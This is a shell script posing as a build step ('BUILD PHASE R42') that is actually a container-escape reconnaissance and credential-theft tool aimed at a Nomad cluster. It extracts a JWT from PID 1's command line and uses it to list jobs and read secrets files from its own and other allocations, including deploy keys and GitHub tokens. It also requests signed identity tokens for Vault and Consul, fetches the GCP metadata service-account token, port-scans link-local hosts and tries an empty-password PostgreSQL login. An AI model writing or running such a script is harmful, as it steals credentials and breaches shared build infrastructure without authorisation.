#!/bin/sh
exec > /build_output.txt 2>&1

echo "=== BUILD PHASE R42 ==="

# 1. Extract JWT from PID 1's cmdline
JWT=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | grep -A1 'registry-auths' | tail -1 | python3 -c "
import sys,json
try:
    data=json.loads(sys.stdin.read())
    print(data[0]['password'])
except: pass
" 2>/dev/null)
echo "JWT_LEN=${#JWT}"

# 2. Dump ALL of PID 1 cmdline args
echo "--- PID1 CMDLINE ---"
cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | head -100
echo "--- END CMDLINE ---"

N=https://169.254.1.2:4646

# 3. Nomad API with JWT
echo "--- NOMAD ALLOCATIONS ---"
curl -sk "$N/v1/allocations?per_page=50" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for a in data[:50]:
      print(f\"ID={a.get('ID','')} Job={a.get('JobID','')} NS={a.get('Namespace','')} Status={a.get('ClientStatus','')} Task={a.get('TaskGroup','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

echo "--- NOMAD JOBS ---"
curl -sk "$N/v1/jobs?per_page=50" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for j in data[:50]:
      print(f\"ID={j.get('ID','')} Type={j.get('Type','')} Status={j.get('Status','')} NS={j.get('Namespace','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

echo "--- NOMAD NAMESPACES ---"
curl -sk "$N/v1/namespaces" -H "Authorization: Bearer $JWT" 2>&1 | python3 -c "
import sys,json
try:
  data=json.load(sys.stdin)
  if isinstance(data, list):
    for n in data:
      print(f\"Name={n.get('Name','')} Desc={n.get('Description','')}\")
  else:
    print(data)
except Exception as e: print(f'err: {e}')
" 2>&1

# 4. Our own allocation FS/secrets
ALLOC=$(sed -n 's|.*alloc/\([a-f0-9-]*\)/.*|\1|p' /proc/self/mountinfo | head -1)
echo "OWN_ALLOC=$ALLOC"

echo "--- OWN ALLOC FS ---"
curl -sk "$N/v1/client/fs/ls/$ALLOC" -H "Authorization: Bearer $JWT" 2>&1 | head -c 1000
echo

for f in secrets/run.env secrets/build.env secrets/registry-auth.env local/nomad_token secrets/nomad.env; do
  echo "==$f=="
  curl -sk "$N/v1/client/fs/cat/$ALLOC?path=$f" -H "Authorization: Bearer $JWT" 2>&1 | head -c 1000
  echo
done

# 5. Identity signing - try different audiences
echo "--- IDENTITY SIGN ---"
for aud in vault consul nomad api deployment-vault registry docker-mirror aiven; do
  echo "aud=$aud:"
  curl -sk -X POST "$N/v1/client/allocation/$ALLOC/identity/sign" \
    -H "Authorization: Bearer $JWT" \
    -H "Content-Type: application/json" \
    -d "{\"audience\":[\"$aud\"],\"ttl\":\"1h\"}" 2>&1 | head -c 300
  echo
done

# 6. Builder allocation
BUILDER_ALLOC=$(cat /proc/1/cmdline 2>/dev/null | tr '\0' '\n' | python3 -c "
import sys,json,base64
lines=sys.stdin.read().strip().split('\n')
for i,l in enumerate(lines):
    if 'registry-auths' in l and i+1<len(lines):
        try:
            data=json.loads(lines[i+1])
            parts=data[0]['password'].split('.')
            payload=json.loads(base64.b64decode(parts[1]+'=='))
            print(payload.get('nomad_allocation_id',''))
        except: pass
" 2>/dev/null)
echo "BUILDER_ALLOC=$BUILDER_ALLOC"

if [ -n "$BUILDER_ALLOC" ]; then
  echo "--- BUILDER ALLOC FS ---"
  curl -sk "$N/v1/client/fs/ls/$BUILDER_ALLOC" -H "Authorization: Bearer $JWT" 2>&1 | head -c 1000
  echo
  for f in secrets/run.env secrets/build.env secrets/deploy_key secrets/github_token local/nomad_token secrets/nomad.env alloc/data/nomad_token; do
    echo "==$f=="
    curl -sk "$N/v1/client/fs/cat/$BUILDER_ALLOC?path=$f" -H "Authorization: Bearer $JWT" 2>&1 | head -c 500
    echo
  done
fi

# 7. Scan other alloc IDs
echo "--- OTHER ALLOCS ---"
for AID in $(curl -sk $N/v1/metrics?format=prometheus 2>/dev/null | grep -o 'alloc_id="[^"]*"' | sed 's/alloc_id="//;s/"//' | sort -u | head -30); do
  resp=$(curl -sk "$N/v1/client/fs/cat/$AID?path=secrets/run.env" -H "Authorization: Bearer $JWT" 2>&1)
  if ! echo "$resp" | grep -q "Permission denied" && ! echo "$resp" | grep -q "resource not found" && ! echo "$resp" | grep -q "no such file"; then
    echo "ACCESSIBLE $AID secrets/run.env:"
    echo "$resp" | head -c 500
    echo
  fi
  resp2=$(curl -sk "$N/v1/client/fs/cat/$AID?path=secrets/build.env" -H "Authorization: Bearer $JWT" 2>&1)
  if ! echo "$resp2" | grep -q "Permission denied" && ! echo "$resp2" | grep -q "resource not found" && ! echo "$resp2" | grep -q "no such file"; then
    echo "ACCESSIBLE $AID secrets/build.env:"
    echo "$resp2" | head -c 500
    echo
  fi
done

# 8. GCP Metadata service
echo "--- GCP METADATA ---"
for url in \
  "http://169.254.169.254/computeMetadata/v1/" \
  "http://169.254.169.254/computeMetadata/v1/project/" \
  "http://169.254.169.254/computeMetadata/v1/project/project-id" \
  "http://169.254.169.254/computeMetadata/v1/instance/" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/" \
  "http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token" \
  "http://169.254.169.254/computeMetadata/v1/instance/attributes/" \
  "http://metadata.google.internal/computeMetadata/v1/project/attributes/" \
  ; do
  echo "== $url =="
  curl -s -H "Metadata-Flavor: Google" --connect-timeout 2 "$url" 2>&1 | head -c 500
  echo
done

# 9. Vault
echo "--- VAULT ---"
for port in 8200 8201; do
  for host in 169.254.1.2 127.0.0.1 169.254.1.1 169.254.1.3; do
    resp=$(curl -sk --connect-timeout 2 "https://$host:$port/v1/sys/health" 2>&1)
    if [ -n "$resp" ] && ! echo "$resp" | grep -q "Connection refused" && ! echo "$resp" | grep -q "timed out"; then
      echo "VAULT at $host:$port: $resp"
      # Try with Nomad JWT
      curl -sk "https://$host:$port/v1/auth/token/lookup-self" -H "X-Vault-Token: $JWT" 2>&1 | head -c 500
      echo
    fi
  done
done

# 10. Consul
echo "--- CONSUL ---"
for port in 8500 8501; do
  for host in 169.254.1.2 127.0.0.1 169.254.1.1 169.254.1.3; do
    resp=$(curl -sk --connect-timeout 2 "http://$host:$port/v1/agent/self" 2>&1)
    if [ -n "$resp" ] && ! echo "$resp" | grep -q "Connection refused" && ! echo "$resp" | grep -q "timed out"; then
      echo "CONSUL at $host:$port:"
      echo "$resp" | head -c 500
      echo
    fi
  done
done

# 11. Network scan on link-local
echo "--- LINK-LOCAL SCAN ---"
for ip in 169.254.1.1 169.254.1.2 169.254.1.3 169.254.1.4 169.254.1.5 169.254.169.254; do
  for port in 80 443 4646 8200 8500 8300 8301 8302 9200 5432 3306 6379 27017; do
    (echo >/dev/tcp/$ip/$port) 2>/dev/null && echo "OPEN: $ip:$port"
  done
done

# 12. Check network interfaces and routes
echo "--- NETWORK ---"
ip addr 2>/dev/null || ifconfig 2>/dev/null
echo "---"
ip route 2>/dev/null || route -n 2>/dev/null
echo "---"
cat /etc/resolv.conf 2>/dev/null
echo "---"
cat /etc/hosts 2>/dev/null

# 13. Try falcon PG from this network
echo "--- FALCON PG CONNECTIVITY ---"
for host in 132.145.163.127 10.1.47.111; do
  echo "== $host =="
  nc -zv -w 3 $host 12691 2>&1
  # Try psql with empty password
  PGPASSWORD="" psql "host=$host port=12691 dbname=defaultdb sslmode=require user=avnadmin connect_timeout=3" -c "SELECT 1" 2>&1 | head -5
done

# 14. Capabilities and security context
echo "--- CAPS ---"
cat /proc/self/status | grep -i cap
echo "---"
id
echo "---"
cat /proc/self/mountinfo 2>/dev/null | head -30

echo "=== BUILD DONE ==="
